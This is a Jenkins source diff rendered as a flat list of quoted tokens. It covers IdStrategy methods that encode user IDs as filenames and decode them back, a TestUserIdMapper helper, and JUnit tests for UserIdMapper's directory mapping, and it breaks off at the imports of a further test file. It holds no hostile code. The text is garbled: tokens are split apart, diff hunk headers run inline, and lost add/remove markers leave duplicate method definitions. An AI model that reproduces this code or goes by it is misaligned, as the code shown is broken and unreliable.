"0", ",", "id", ".", "length", "(", ")-", "1", ")", "+\"", "$", "002e", "\"", ";", "}", "else", "if", "(", "id", ".", "startsWith", "(", "\"-", "\")", ")", "{", "return", "\"", "$", "002d", "\"", "+", "id", ".", "substring", "(", "1", ")", ";", "}", "return", "id", ";", "}", "}", "else", "{", "StringBuilder", "buf", "=", "new", "StringBuilder", "(", "id", ".", "length", "(", ")", "+", "16", ")", ";", "for", "(", "char", "c", ":", "id", ".", "toCharArray", "(", "))", "{", "if", "(", "'", "a", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "z", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "0", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "9", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "_", "'", "=", "=", "c", "|", "|", "'", "-'", "=", "=", "c", "|", "|", "'", "'", "=", "=", "c", "|", "|", "'", "@'", "=", "=", "c", "|", "|", "'", ".'", "=", "=", "c", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "A", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "Z", "'", ")", "{", "buf", ".", "append", "(", "'~", "')", ";", "buf", ".", "append", "(", "Character", ".", "toLowerCase", "(", "c", ")", ");", "}", "else", "{", "buf", ".", "append", "(", "'$", "')", ";", "buf", ".", "append", "(", "StringUtils", ".", "leftPad", "(", "Integer", ".", "toHexString", "(", "c", "&", "0xffff", ")", ",", "4", ",", "'", "0", "'", "))", ";", "}", "}", "return", "buf", ".", "toString", "(", ");", "}", "}", "/", "**", "*", "{", "@", "inheritDoc", "}", "*", "/", "@", "Nonnull", "@", "Override", "public", "String", "legacyFilenameOf", "(", "@", "Nonnull", "String", "id", ")", "{", "if", "(", "id", ".", "matches", "(", "\"[", "a", "-", "z0", "-", "9_", ".", "@", "-]", "+\"", "))", "{", "return", "id", ";", "}", "else", "{", "StringBuilder", "buf", "=", "new", "StringBuilder", "(", "id", ".", "length", "(", ")", "+", "16", ")", ";", "for", "(", "char", "c", ":", "id", ".", "toCharArray", "(", "))", "{", "if", "(", "'", "a", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "z", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "0", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "9", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "_", "'", "=", "=", "c", "|", "|", "'", ".'", "=", "=", "c", "|", "|", "'", "-'", "=", "=", "c", "|", "|", "'", "'", "=", "=", "c", "|", "|", "'", "@'", "=", "=", "c", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "A", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "Z", "'", ")", "{", "buf", ".", "append", "(", "'~", "')", ";", "buf", ".", "append", "(", "Character", ".", "toLowerCase", "(", "c", ")", ");", "}", "else", "{", "buf", ".", "append", "(", "'$", "')", ";", "buf", ".", "append", "(", "StringUtils", ".", "leftPad", "(", "Integer", ".", "toHexString", "(", "c", "&", "0xffff", ")", ",", "4", ",", "'", "0", "'", "))", ";", "}", "}", "return", "buf", ".", "toString", "(", ");", "}", "public", "String", "idFromFilename", "(", "@", "Nonnull", "String", "filename", ")", "{", "String", "id", "=", "applyPatternRepeatedly", "(", "CAPITALIZATION_PATTERN", ",", "filename", ",", "this", ":", ":", "convertCapitalizedAscii", ")", ";", "return", "applyPatternRepeatedly", "(", "PSEUDO_UNICODE_PATTERN", ",", "id", ",", "this", ":", ":", "convertPseudoUnicode", ")", ";", "}", "@", "Override", "public", "String", "idFromFilename", "(", "@", "Nonnull", "String", "filename", ")", "{", "if", "(", "filename", ".", "matches", "(", "\"[", "a", "-", "z0", "-", "9_", ".", "-", "]+", "\")", ")", "{", "return", "filename", ";", "}", "else", "{", "StringBuilder", "buf", "=", "new", "StringBuilder", "(", "filename", ".", "length", "(", "))", ";", "final", "char", "[", "]", "chars", "=", "filename", ".", "toCharArray", "(", ");", "for", "(", "int", "i", "=", "0", ";", "i", "<", "chars", ".", "length", ";", "i", "+", "+)", "{", "char", "c", "=", "chars", "[", "i", "]", ";", "if", "(", "'", "a", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "z", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "0", "'", "<", "=", "c", "&", "&", "c", "<", "=", "'", "9", "'", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "'", "_", "'", "=", "=", "c", "|", "|", "'", ".'", "=", "=", "c", "|", "|", "'", "-'", "=", "=", "c", "|", "|", "'", "'", "=", "=", "c", "|", "|", "'", "@'", "=", "=", "c", ")", "{", "buf", ".", "append", "(", "c", ")", ";", "}", "else", "if", "(", "c", "=", "=", "'", "~'", ")", "{", "i", "+", "+;", "if", "(", "i", "<", "chars", ".", "length", ")", "{", "buf", ".", "append", "(", "Character", ".", "toUpperCase", "(", "chars", "[", "i", "]", "))", ";", "}", "}", "else", "if", "(", "c", "=", "=", "'", "$'", ")", "{", "StringBuilder", "hex", "=", "new", "StringBuilder", "(", "4", ")", ";", "i", "+", "+;", "if", "(", "i", "<", "chars", ".", "length", ")", "{", "hex", ".", "append", "(", "chars", "[", "i", "]", ");", "}", "else", "{", "break", ";", "}", "i", "+", "+;", "if", "(", "i", "<", "chars", ".", "length", ")", "{", "hex", ".", "append", "(", "chars", "[", "i", "]", ");", "}", "else", "{", "break", ";", "}", "i", "+", "+;", "if", "(", "i", "<", "chars", ".", "length", ")", "{", "hex", ".", "append", "(", "chars", "[", "i", "]", ");", "}", "else", "{", "break", ";", "}", "i", "+", "+;", "if", "(", "i", "<", "chars", ".", "length", ")", "{", "hex", ".", "append", "(", "chars", "[", "i", "]", ");", "}", "else", "{", "break", ";", "}", "try", "{", "buf", ".", "append", "(", "Character", ".", "valueOf", "(", "(", "char", ")", "Integer", ".", "parseInt", "(", "hex", ".", "toString", "(", "),", "16", ")", "))", ";", "}", "catch", "(", "NumberFormatException", "x", ")", "{", "buf", ".", "append", "(", "'$", "')", ".", "append", "(", "hex", ")", ";", "}", "}", "}", "return", "buf", ".", "toString", "(", ");", "}", "private", "Character", "convertCapitalizedAscii", "(", "String", "encoded", ")", "{", "return", "encoded", ".", "toUpperCase", "(", ").", "charAt", "(", "1", ")", ";", "}", "/", "**", "@", "@", "-", "532", ",", "15", "+", "265", ",", "6", "@", "@", "public", "boolean", "equals", "(", "@", "Nonnull", "String", "id1", ",", "@", "Nonnull", "String", "id2", ")", "{", "return", "StringUtils", ".", "equals", "(", "id1", ",", "id2", ")", ";", "}", "/", "**", "*", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "@", "Nonnull", "public", "String", "keyFor", "(", "@", "Nonnull", "String", "id", ")", "{", "return", "id", ";", "}", "/", "**", "*", "{", "@", "inheritDoc", "}", "*", "/", "@", "@", "-", "576", ",", "15", "+", "300", ",", "6", "@", "@", "public", "String", "getDisplayName", "(", ")", "{", "@", "DataBoundConstructor", "public", "CaseSensitiveEmailAddress", "(", ")", "{", "}", "/", "**", "*", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "@", "Nonnull", "public", "String", "filenameOf", "(", "@", "Nonnull", "String", "id", ")", "{", "return", "super", ".", "filenameOf", "(", "keyFor", "(", "id", ")", ");", "}", "/", "**", "*", "{", "@", "inheritDoc", "}", "*", "/", "@", "@", "-", "0", ",", "0", "+", "1", ",", "27", "@", "@", "package", "hudson", ".", "model", ";", "import", "jenkins", ".", "model", ".", "IdStrategy", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "class", "TestUserIdMapper", "extends", "UserIdMapper", "{", "private", "File", "usersDirectory", ";", "private", "IdStrategy", "idStrategy", ";", "TestUserIdMapper", "(", "File", "usersDirectory", ",", "IdStrategy", "idStrategy", ")", "throws", "IOException", "{", "this", ".", "usersDirectory", "=", "usersDirectory", ";", "this", ".", "idStrategy", "=", "idStrategy", ";", "}", "@", "Override", "protected", "File", "getUsersDirectory", "(", ")", "{", "return", "usersDirectory", ";", "}", "@", "Override", "protected", "IdStrategy", "getIdStrategy", "(", ")", "{", "return", "idStrategy", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "309", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2018", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "model", ";", "import", "jenkins", ".", "model", ".", "IdStrategy", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "rules", ".", "TestName", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "static", "org", ".", "hamcrest", ".", "MatcherAssert", ".", "assertThat", ";", "import", "static", "org", ".", "hamcrest", ".", "Matchers", ".", "*;", "public", "class", "UserIdMapperTest", "{", "@", "Rule", "public", "TestName", "name", "=", "new", "TestName", "(", ");", "@", "Test", "public", "void", "testNonexistentFileLoads", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "}", "@", "Test", "public", "void", "testEmptyGet", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "assertThat", "(", "mapper", ".", "getDirectory", "(", "\"", "anything", "\"", "),", "nullValue", "(", "))", ";", "}", "@", "Test", "public", "void", "testSimplePutGet", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "directory", ",", "is", "(", "mapper", ".", "getDirectory", "(", "user1", ")", "))", ";", "}", "@", "Test", "public", "void", "testMultiple", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "String", "user2", "=", "\"", "user2", "\"", ";", "File", "directory2", "=", "mapper", ".", "putIfAbsent", "(", "user2", ",", "true", ")", ";", "String", "user3", "=", "\"", "user3", "\"", ";", "File", "directory3", "=", "mapper", ".", "putIfAbsent", "(", "user3", ",", "true", ")", ";", "assertThat", "(", "directory1", ",", "is", "(", "mapper", ".", "getDirectory", "(", "user1", ")", "))", ";", "assertThat", "(", "directory2", ",", "is", "(", "mapper", ".", "getDirectory", "(", "user2", ")", "))", ";", "assertThat", "(", "directory3", ",", "is", "(", "mapper", ".", "getDirectory", "(", "user3", ")", "))", ";", "}", "@", "Test", "public", "void", "testMultipleSaved", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "UserIdMigratorTest", ".", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "IdStrategy", "idStrategy", "=", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "UserIdMapper", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "String", "user2", "=", "\"", "user2", "\"", ";", "File", "directory2", "=", "mapper", ".", "putIfAbsent", "(", "user2", ",", "true", ")", ";", "String", "user3", "=", "\"", "user3", "\"", ";", "File", "directory3", "=", "mapper", ".", "putIfAbsent", "(", "user3", ",", "true", ")", ";", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "assertThat", "(", "directory1", ",", "is", "(", "mapper", ".", "getDirectory", "(", "user1", ")", "))", ";", "assertThat", "(", "directory2", ",", "is", "(", "mapper", ".", "getDirectory", "(", "user2", ")", "))", ";", "assertThat", "(", "directory3", ",", "is", "(", "mapper", ".", "getDirectory", "(", "user3", ")", "))", ";", "}", "@", "Test", "public", "void", "testRepeatPut", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "File", "directory2", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "directory1", ",", "is", "(", "directory2", ")", ");", "}", "@", "Test", "public", "void", "testIsNotMapped", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "\"", "anything", "\"", "),", "is", "(", "false", ")", ");", "}", "@", "Test", "public", "void", "testIsMapped", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ")", ",", "is", "(", "true", ")", ");", "}", "@", "Test", "public", "void", "testInitialUserIds", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", "),", "empty", "(", "))", ";", "}", "@", "Test", "public", "void", "testSingleUserIds", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", "),", "hasSize", "(", "1", ")", ");", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", ").", "iterator", "(", ").", "next", "(", "),", "is", "(", "user1", ")", ");", "}", "@", "Test", "public", "void", "testMultipleUserIds", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "String", "user2", "=", "\"", "user2", "\"", ";", "File", "directory2", "=", "mapper", ".", "putIfAbsent", "(", "user2", ",", "true", ")", ";", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", "),", "hasSize", "(", "2", ")", ");", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", "),", "hasItems", "(", "user1", ",", "user2", ")", ");", "}", "@", "Test", "public", "void", "testRemove", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "mapper", ".", "remove", "(", "user1", ")", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ")", ",", "is", "(", "false", ")", ");", "}", "@", "Test", "public", "void", "testRemoveAfterSave", "(", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "UserIdMigratorTest", ".", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "IdStrategy", "idStrategy", "=", "IdStrategy", ".", "CASE_INSENSITIVE", ";", "UserIdMapper", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "mapper", ".", "remove", "(", "user1", ")", ";", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ")", ",", "is", "(", "false", ")", ");", "}", "@", "Test", "public", "void", "testPutGetCaseInsensitive", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "mapper", ".", "getDirectory", "(", "user1", ".", "toUpperCase", "(", "))", ",", "notNullValue", "(", "))", ";", "}", "@", "Test", "public", "void", "testPutGetCaseSensitive", "(", ")", "throws", "IOException", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitive", "(", ");", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "idStrategy", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "mapper", ".", "getDirectory", "(", "user1", ".", "toUpperCase", "(", "))", ",", "nullValue", "(", "))", ";", "}", "@", "Test", "public", "void", "testIsMappedCaseInsensitive", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ".", "toUpperCase", "(", "))", ",", "is", "(", "true", ")", ");", "}", "@", "Test", "public", "void", "testIsMappedCaseSensitive", "(", ")", "throws", "IOException", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitive", "(", ");", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "idStrategy", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ".", "toUpperCase", "(", "))", ",", "is", "(", "false", ")", ");", "}", "@", "Test", "public", "void", "testRemoveCaseInsensitive", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "mapper", ".", "remove", "(", "user1", ".", "toUpperCase", "(", "))", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ")", ",", "is", "(", "false", ")", ");", "}", "@", "Test", "public", "void", "testRemoveCaseSensitive", "(", ")", "throws", "IOException", "{", "IdStrategy", "idStrategy", "=", "new", "IdStrategy", ".", "CaseSensitive", "(", ");", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "idStrategy", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "mapper", ".", "remove", "(", "user1", ".", "toUpperCase", "(", "))", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ")", ",", "is", "(", "true", ")", ");", "}", "@", "Test", "public", "void", "testRepeatRemove", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "mapper", ".", "remove", "(", "user1", ")", ";", "mapper", ".", "remove", "(", "user1", ")", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ")", ",", "is", "(", "false", ")", ");", "}", "@", "Test", "public", "void", "testClear", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "mapper", ".", "clear", "(", ");", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ")", ",", "is", "(", "false", ")", ");", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", "),", "empty", "(", "))", ";", "}", "@", "Test", "public", "void", "testReload", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "user1", "\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "mapper", ".", "reload", "(", ");", "assertThat", "(", "mapper", ".", "isMapped", "(", "user1", ")", ",", "is", "(", "true", ")", ");", "assertThat", "(", "mapper", ".", "getConvertedUserIds", "(", "),", "hasSize", "(", "1", ")", ");", "}", "@", "Test", "public", "void", "testDirectoryFormatBasic", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "1user", "\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "directory1", ".", "getName", "(", "),", "startsWith", "(", "user1", "+", "'", "_", "'", "))", ";", "}", "@", "Test", "public", "void", "testDirectoryFormatLongerUserId", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "muchlongeruserid", "\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "directory1", ".", "getName", "(", "),", "startsWith", "(", "\"", "muchlongeruser_", "\"", "))", ";", "}", "@", "Test", "public", "void", "testDirectoryFormatAllSuppressedCharacters", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "!@", "#$", "%^", "\";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "directory1", ".", "getName", "(", "),", "startsWith", "(", "\"", "_", "\"", "))", ";", "}", "@", "Test", "public", "void", "testDirectoryFormatSingleCharacter", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", ".\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "directory1", ".", "getName", "(", "),", "startsWith", "(", "\"", "_", "\"", "))", ";", "}", "@", "Test", "public", "void", "testDirectoryFormatMixed", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "String", "user1", "=", "\"", "a", "$", "b", "!", "c", "^", "d", "~", "e", "@", "f", "\"", ";", "File", "directory1", "=", "mapper", ".", "putIfAbsent", "(", "user1", ",", "true", ")", ";", "assertThat", "(", "directory1", ".", "getName", "(", "),", "startsWith", "(", "\"", "abcdef_", "\"", "))", ";", "}", "@", "Test", "(", "expected", "=", "IOException", ".", "class", ")", "public", "void", "testXmlFileCorrupted", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "}", "@", "Test", "public", "void", "testDuplicatedUserId", "(", ")", "throws", "IOException", "{", "UserIdMapper", "mapper", "=", "createUserIdMapper", "(", "IdStrategy", ".", "CASE_INSENSITIVE", ")", ";", "assertThat", "(", "mapper", ".", "isMapped", "(", "\"", "user2", "\"", "),", "is", "(", "true", ")", ");", "assertThat", "(", "mapper", ".", "isMapped", "(", "\"", "user1", "\"", "),", "is", "(", "true", ")", ");", "}", "private", "UserIdMapper", "createUserIdMapper", "(", "IdStrategy", "idStrategy", ")", "throws", "IOException", "{", "File", "usersDirectory", "=", "UserIdMigratorTest", ".", "createTestDirectory", "(", "getClass", "(", "),", "name", ")", ";", "TestUserIdMapper", "mapper", "=", "new", "TestUserIdMapper", "(", "usersDirectory", ",", "idStrategy", ")", ";", "mapper", ".", "init", "(", ");", "return", "mapper", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "205", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2018", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "model", ";", "import", "jenkins", ".", "model", ".", "IdStrategy", ";", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "FileUtils", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "rules", ".", "TestName", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "nio", ".", "file", ".", "Files", ";", "import", "java", ".", "nio", ".", "file", ".", "Paths", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "static", "org", ".", "hamcrest", ".", "MatcherAssert", 